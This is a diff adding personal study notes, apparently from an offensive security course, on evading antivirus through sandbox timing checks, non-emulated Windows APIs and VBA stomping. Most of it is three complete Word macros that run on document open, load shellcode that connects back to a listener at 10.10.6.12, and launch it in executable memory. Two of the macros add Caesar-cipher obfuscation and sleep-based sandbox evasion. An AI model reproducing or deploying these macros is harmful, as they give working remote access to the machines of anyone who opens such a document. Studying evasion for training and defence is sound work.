@@ -456,6 +456,265 @@ We employ heiristics to find out if our application is being run in a simulation
 
 # Simple sleep timers
 
+Using sleep timers
+```C#
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+```
+
+```C#
+DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+```
+
+### 6.6.1.1 Exercises
+1. Implement the Sleep function to perform time-lapse detection in the C# project both with 
+and without encryption.
+2. Convert the C# project into a Jscript file with DotNetToJscript. Is it detected?
+
+# Non emulated APIs
+
+Antivirus emulator engines only simulate the execution of most common executable file formats 
+and functions. Knowing this, we can attempt to bypass detection with a function (typically a 
+Win32 API) that is either incorrectly emulated or is not emulated at all
+
+VirtualAllocExNuma 
+
+```C#
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
+ uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+```
+
+```C#
+[DllImport("kernel32.dll")]
+static extern IntPtr GetCurrentProcess();
+```
+
+```C#
+IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 
+0);
+if(mem == null)
+{
+ return;
+}
+```
+
+### 6.6.2.1 Exercises
+1. Implement a heuristics detection bypass with VirtualAllocExNuma.
+2. Use the Win32 FlsAlloc307 API to create a heuristics detection bypass.
+3. Experiment and search for additional APIs that are not emulated by antivirus products
+
+# Office Please BYpass Antivirus
+
+looking at ou previous vba script
+
+10.10.6.12:4443
+```vb
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+ Dim buf As Variant
+ Dim addr As LongPtr
+ Dim counter As Long
+ Dim data As Long
+ Dim res As LongPtr
+
+ buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 81, 72, 139, 82, 32, 86, 77, 49, 201, 72, 15, 183, 74, 74, 72, 139, 114, 80, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
+    11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 68, 139, 64, 32, 80, 73, 1, 208, 139, 72, 24, 227, 86, 77, 49, 201, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
+    208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 72, 49, 219, 83, 73, 190, 119, 105, 110, 105, 110, 101, 116, 0, 65, 86, 72, 137, 225, 73, 199, 194, 76, 119, 38, 7, _
+    255, 213, 83, 83, 72, 137, 225, 83, 90, 77, 49, 192, 77, 49, 201, 83, 83, 73, 186, 58, 86, 121, 167, 0, 0, 0, 0, 255, 213, 232, 11, 0, 0, 0, 49, 48, 46, 49, 48, 46, 54, 46, 49, 50, 0, 90, 72, 137, 193, 73, 199, 192, 91, 17, 0, 0, 77, 49, 201, 83, 83, 106, 3, 83, 73, 186, 87, 137, 159, 198, 0, 0, 0, 0, 255, 213, 232, 246, 0, 0, _
+    0, 47, 85, 121, 48, 99, 79, 71, 77, 88, 104, 101, 102, 67, 69, 115, 77, 81, 111, 78, 120, 81, 72, 65, 99, 110, 101, 107, 105, 110, 87, 52, 53, 45, 81, 84, 115, 109, 119, 68, 49, 105, 87, 68, 90, 73, 119, 120, 121, 121, 78, 89, 71, 119, 53, 99, 71, 71, 85, 101, 99, 68, 116, 118, 89, 55, 103, 73, 104, 108, 89, 65, 71, 121, 100, 85, 98, 100, 56, 95, _
+    74, 104, 84, 87, 106, 81, 119, 49, 101, 89, 97, 120, 109, 71, 89, 68, 100, 110, 80, 68, 48, 113, 120, 52, 69, 109, 48, 88, 80, 69, 51, 69, 83, 53, 99, 68, 120, 65, 68, 116, 50, 78, 69, 122, 110, 79, 67, 104, 70, 56, 117, 76, 112, 71, 81, 87, 71, 110, 114, 103, 100, 90, 86, 97, 52, 79, 78, 108, 108, 113, 87, 87, 73, 89, 71, 56, 70, 76, 85, 105, _
+    111, 113, 106, 72, 82, 54, 57, 70, 102, 111, 76, 118, 109, 89, 79, 83, 57, 113, 95, 112, 101, 76, 82, 98, 45, 77, 69, 77, 52, 122, 110, 108, 115, 89, 97, 66, 100, 70, 79, 54, 109, 85, 87, 53, 45, 104, 107, 45, 52, 57, 55, 100, 57, 98, 49, 97, 100, 45, 98, 57, 122, 48, 119, 110, 120, 114, 121, 48, 75, 98, 112, 51, 71, 69, 70, 68, 80, 71, 120, 73, _
+    52, 100, 71, 98, 78, 119, 0, 72, 137, 193, 83, 90, 65, 88, 77, 49, 201, 83, 72, 184, 0, 50, 168, 132, 0, 0, 0, 0, 80, 83, 83, 73, 199, 194, 235, 85, 46, 59, 255, 213, 72, 137, 198, 106, 10, 95, 72, 137, 241, 106, 31, 90, 82, 104, 128, 51, 0, 0, 73, 137, 224, 106, 4, 65, 89, 73, 186, 117, 70, 158, 134, 0, 0, 0, 0, 255, 213, 77, 49, 192, _
+    83, 90, 72, 137, 241, 77, 49, 201, 77, 49, 201, 83, 83, 73, 199, 194, 45, 6, 24, 123, 255, 213, 133, 192, 117, 31, 72, 199, 193, 136, 19, 0, 0, 73, 186, 68, 240, 53, 224, 0, 0, 0, 0, 255, 213, 72, 255, 207, 116, 2, 235, 170, 232, 85, 0, 0, 0, 83, 89, 106, 64, 90, 73, 137, 209, 193, 226, 16, 73, 199, 192, 0, 16, 0, 0, 73, 186, 88, 164, 83, _
+    229, 0, 0, 0, 0, 255, 213, 72, 147, 83, 83, 72, 137, 231, 72, 137, 241, 72, 137, 218, 73, 199, 192, 0, 32, 0, 0, 73, 137, 249, 73, 186, 18, 150, 137, 226, 0, 0, 0, 0, 255, 213, 72, 131, 196, 32, 133, 192, 116, 178, 102, 139, 7, 72, 1, 195, 133, 192, 117, 210, 88, 195, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
+ 
+ addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+ 
+ For counter = LBound(buf) To UBound(buf)
+ data = buf(counter)
+ res = RtlMoveMemory(addr + counter, data, 1)
+ Next counter
+ 
+ res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+```
+
+### Using caesar cipher and time 
+
+```
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+ Dim buf As Variant
+ Dim addr As LongPtr
+ Dim counter As Long
+ Dim data As Long
+ Dim res As LongPtr
+
+ buf = Array(54, 74, 133, 230, 242, 234, 206, 2, 2, 2, 67, 83, 67, 82, 84, 74, 51, 212, 83, 88, 103, 74, 141, 84, 98, 74, 141, 84, 26, 74, 141, 84, 34, 74, 17, 185, 76, 76, 79, 51, 203, 74, 141, 116, 82, 74, 51, 194, 174, 62, _
+99, 126, 4, 46, 34, 67, 195, 203, 15, 67, 3, 195, 228, 239, 84, 74, 141, 84, 34, 67, 83, 141, 68, 62, 74, 3, 210, 104, 131, 122, 26, 13, 4, 17, 135, 116, 2, 2, 2, 141, 130, 138, 2, 2, 2, 74, 135, 194, 118, 105, _
+74, 3, 210, 70, 141, 66, 34, 82, 75, 3, 210, 141, 74, 26, 229, 88, 74, 1, 203, 79, 51, 203, 67, 141, 54, 138, 74, 3, 216, 74, 51, 194, 67, 195, 203, 15, 174, 67, 3, 195, 58, 226, 119, 243, 78, 5, 78, 38, 10, 71, _
+59, 211, 119, 218, 90, 70, 141, 66, 38, 75, 3, 210, 104, 67, 141, 14, 74, 70, 141, 66, 30, 75, 3, 210, 67, 141, 6, 138, 67, 90, 74, 3, 210, 67, 90, 96, 91, 92, 67, 90, 67, 91, 67, 92, 74, 133, 238, 34, 67, 84, _
+1, 226, 90, 67, 91, 92, 74, 141, 20, 235, 77, 1, 1, 1, 95, 74, 51, 221, 85, 75, 192, 121, 107, 112, 107, 112, 103, 118, 2, 67, 88, 74, 139, 227, 75, 201, 196, 78, 121, 40, 9, 1, 215, 85, 85, 74, 139, 227, 85, 92, _
+79, 51, 194, 79, 51, 203, 85, 85, 75, 188, 60, 88, 123, 169, 2, 2, 2, 2, 1, 215, 234, 13, 2, 2, 2, 51, 50, 48, 51, 50, 48, 56, 48, 51, 52, 2, 92, 74, 139, 195, 75, 201, 194, 94, 19, 2, 2, 79, 51, 203, _
+85, 85, 108, 5, 85, 75, 188, 89, 139, 161, 200, 2, 2, 2, 2, 1, 215, 234, 98, 2, 2, 2, 49, 82, 82, 78, 117, 110, 114, 59, 113, 83, 103, 56, 76, 53, 91, 108, 104, 56, 122, 69, 56, 105, 83, 77, 83, 90, 103, 87, _
+113, 76, 117, 58, 108, 58, 73, 89, 106, 51, 118, 88, 118, 114, 109, 124, 53, 108, 78, 116, 101, 108, 79, 108, 124, 104, 79, 97, 71, 53, 114, 108, 108, 112, 97, 73, 109, 67, 123, 86, 68, 58, 87, 102, 102, 114, 69, 92, 111, 87, _
+102, 47, 112, 86, 80, 74, 124, 100, 107, 47, 84, 53, 99, 71, 81, 90, 69, 2, 74, 139, 195, 85, 92, 67, 90, 79, 51, 203, 85, 74, 186, 2, 52, 170, 134, 2, 2, 2, 2, 82, 85, 85, 75, 201, 196, 237, 87, 48, 61, 1, _
+215, 74, 139, 200, 108, 12, 97, 74, 139, 243, 108, 33, 92, 84, 106, 130, 53, 2, 2, 75, 139, 226, 108, 6, 67, 91, 75, 188, 119, 72, 160, 136, 2, 2, 2, 2, 1, 215, 79, 51, 194, 85, 92, 74, 139, 243, 79, 51, 203, 79, _
+51, 203, 85, 85, 75, 201, 196, 47, 8, 26, 125, 1, 215, 135, 194, 119, 33, 74, 201, 195, 138, 21, 2, 2, 75, 188, 70, 242, 55, 226, 2, 2, 2, 2, 1, 215, 74, 1, 209, 118, 4, 237, 172, 234, 87, 2, 2, 2, 85, 91, _
+108, 66, 92, 75, 139, 211, 195, 228, 18, 75, 201, 194, 2, 18, 2, 2, 75, 188, 90, 166, 85, 231, 2, 2, 2, 2, 1, 215, 74, 149, 85, 85, 74, 139, 233, 74, 139, 243, 74, 139, 220, 75, 201, 194, 2, 34, 2, 2, 75, 139, _
+251, 75, 188, 20, 152, 139, 228, 2, 2, 2, 2, 1, 215, 74, 133, 198, 34, 135, 194, 118, 180, 104, 141, 9, 74, 3, 197, 135, 194, 119, 212, 90, 197, 90, 108, 2, 91, 75, 201, 196, 242, 183, 164, 88, 1, 215)
+ 
+ For i = 0 To UBound(buf)
+    buf(i) = buf(i) - 2
+Next i
+ 
+ addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+ 
+ For counter = LBound(buf) To UBound(buf)
+ data = buf(counter)
+ res = RtlMoveMemory(addr + counter, data, 1)
+ Next counter
+ 
+ res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+```
+
+### Using time sleep
+
+```
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+
+Function MyMacro()
+ Dim buf As Variant
+ Dim addr As LongPtr
+ Dim counter As Long
+ Dim data As Long
+ Dim res As LongPtr
+ 
+ Dim t1 As Date
+Dim t2 As Date
+Dim time As Long
+t1 = Now()
+Sleep (2000)
+t2 = Now()
+time = DateDiff("s", t1, t2)
+If time < 2 Then
+ Exit Function
+End If
+
+ buf = Array(54, 74, 133, 230, 242, 234, 206, 2, 2, 2, 67, 83, 67, 82, 84, 74, 51, 212, 83, 88, 103, 74, 141, 84, 98, 74, 141, 84, 26, 74, 141, 84, 34, 74, 17, 185, 76, 76, 79, 51, 203, 74, 141, 116, 82, 74, 51, 194, 174, 62, _
+99, 126, 4, 46, 34, 67, 195, 203, 15, 67, 3, 195, 228, 239, 84, 74, 141, 84, 34, 67, 83, 141, 68, 62, 74, 3, 210, 104, 131, 122, 26, 13, 4, 17, 135, 116, 2, 2, 2, 141, 130, 138, 2, 2, 2, 74, 135, 194, 118, 105, _
+74, 3, 210, 70, 141, 66, 34, 82, 75, 3, 210, 141, 74, 26, 229, 88, 74, 1, 203, 79, 51, 203, 67, 141, 54, 138, 74, 3, 216, 74, 51, 194, 67, 195, 203, 15, 174, 67, 3, 195, 58, 226, 119, 243, 78, 5, 78, 38, 10, 71, _
+59, 211, 119, 218, 90, 70, 141, 66, 38, 75, 3, 210, 104, 67, 141, 14, 74, 70, 141, 66, 30, 75, 3, 210, 67, 141, 6, 138, 67, 90, 74, 3, 210, 67, 90, 96, 91, 92, 67, 90, 67, 91, 67, 92, 74, 133, 238, 34, 67, 84, _
+1, 226, 90, 67, 91, 92, 74, 141, 20, 235, 77, 1, 1, 1, 95, 74, 51, 221, 85, 75, 192, 121, 107, 112, 107, 112, 103, 118, 2, 67, 88, 74, 139, 227, 75, 201, 196, 78, 121, 40, 9, 1, 215, 85, 85, 74, 139, 227, 85, 92, _
+79, 51, 194, 79, 51, 203, 85, 85, 75, 188, 60, 88, 123, 169, 2, 2, 2, 2, 1, 215, 234, 13, 2, 2, 2, 51, 50, 48, 51, 50, 48, 56, 48, 51, 52, 2, 92, 74, 139, 195, 75, 201, 194, 94, 19, 2, 2, 79, 51, 203, _
+85, 85, 108, 5, 85, 75, 188, 89, 139, 161, 200, 2, 2, 2, 2, 1, 215, 234, 98, 2, 2, 2, 49, 82, 82, 78, 117, 110, 114, 59, 113, 83, 103, 56, 76, 53, 91, 108, 104, 56, 122, 69, 56, 105, 83, 77, 83, 90, 103, 87, _
+113, 76, 117, 58, 108, 58, 73, 89, 106, 51, 118, 88, 118, 114, 109, 124, 53, 108, 78, 116, 101, 108, 79, 108, 124, 104, 79, 97, 71, 53, 114, 108, 108, 112, 97, 73, 109, 67, 123, 86, 68, 58, 87, 102, 102, 114, 69, 92, 111, 87, _
+102, 47, 112, 86, 80, 74, 124, 100, 107, 47, 84, 53, 99, 71, 81, 90, 69, 2, 74, 139, 195, 85, 92, 67, 90, 79, 51, 203, 85, 74, 186, 2, 52, 170, 134, 2, 2, 2, 2, 82, 85, 85, 75, 201, 196, 237, 87, 48, 61, 1, _
+215, 74, 139, 200, 108, 12, 97, 74, 139, 243, 108, 33, 92, 84, 106, 130, 53, 2, 2, 75, 139, 226, 108, 6, 67, 91, 75, 188, 119, 72, 160, 136, 2, 2, 2, 2, 1, 215, 79, 51, 194, 85, 92, 74, 139, 243, 79, 51, 203, 79, _
+51, 203, 85, 85, 75, 201, 196, 47, 8, 26, 125, 1, 215, 135, 194, 119, 33, 74, 201, 195, 138, 21, 2, 2, 75, 188, 70, 242, 55, 226, 2, 2, 2, 2, 1, 215, 74, 1, 209, 118, 4, 237, 172, 234, 87, 2, 2, 2, 85, 91, _
+108, 66, 92, 75, 139, 211, 195, 228, 18, 75, 201, 194, 2, 18, 2, 2, 75, 188, 90, 166, 85, 231, 2, 2, 2, 2, 1, 215, 74, 149, 85, 85, 74, 139, 233, 74, 139, 243, 74, 139, 220, 75, 201, 194, 2, 34, 2, 2, 75, 139, _
+251, 75, 188, 20, 152, 139, 228, 2, 2, 2, 2, 1, 215, 74, 133, 198, 34, 135, 194, 118, 180, 104, 141, 9, 74, 3, 197, 135, 194, 119, 212, 90, 197, 90, 108, 2, 91, 75, 201, 196, 242, 183, 164, 88, 1, 215)
+ 
+ For i = 0 To UBound(buf)
+    buf(i) = buf(i) - 2
+Next i
+ 
+ addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+ 
+ For counter = LBound(buf) To UBound(buf)
+ data = buf(counter)
+ res = RtlMoveMemory(addr + counter, data, 1)
+ Next counter
+ 
+ res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+
+
+```
+
+### 6.7.1.1 Exercises
+1. Implement the Caesar cipher encryption and time-lapse detection in a VBA macro.
+2. Attempt to reduce the detection rate further by using a different encryption algorithm and 
+routine along with alternative heuristic bypasses.
+
+# Stomping on microsoft word
+
+Security research was released in 2018 discussing how VBA code is stored in Microsoft Word 
+and Excel macros and it can be abused.311 In this section, we will investigate this topic and 
+leverage this technique to reduce our detection
+
+The Microsoft Office file formats used in documents with .doc and .xls extensions rely on the very 
+old and partially-documented proprietary Compound File Binary Format,
+312 which can combine 
+multiple files into a single disk file.
+On the other hand, more modern Microsoft Office file extensions, like .docm and .xlsm, describe 
+an updated and more open file format that is not dissimilar to a .zip file.
+
+Word and Excel documents using the modern macro-enabled formats can be 
+unzipped with 7zip and the contents inspected in a hex editor
+
+flexhex is downloaded from : http://www.flexhex.com/
+
+But using macro in word is replete with problems
+
+![](./macro_issue.png)
+
+after putting thte basic shellcode (without caesar which was working it is not working)
+The P-code is a compiled version of the VBA textual code for 
+the specific version of Microsoft Office and VBA it was created on
+
+
+
+
+### 6.7.2.1 Exercises
+1. Use FlexHex to delve into the file format of Microsoft Word as explained in this section.
+2. Manually stomp out a Microsoft Word document and verify that it still works while improving 
+evasion.
+3. Use the Evil Clippy316 tool (located in C:\Tools\EvilClippy.exe) to automate the VBA Stomping 
+process
+
 
 
 
